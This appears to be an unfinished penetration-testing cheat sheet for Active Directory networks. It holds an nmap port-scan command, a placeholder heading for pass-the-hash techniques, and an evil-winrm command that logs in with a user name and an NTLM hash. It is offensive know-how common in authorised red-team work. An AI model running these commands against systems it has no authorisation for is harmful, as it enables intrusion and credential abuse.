#### Port Scanning

```
#Good for active directory machines.
nmap -Pn -iL <hosts> -p22,3389,5895,47001,88,389,445,80,443,21,8000,8080 -oA internal_scan
```

#### ADD PTH TECHNIQUES HERE


```
#EVIL-WINRM
evil-winrm -u <user> -H <hash> -i <ip>

```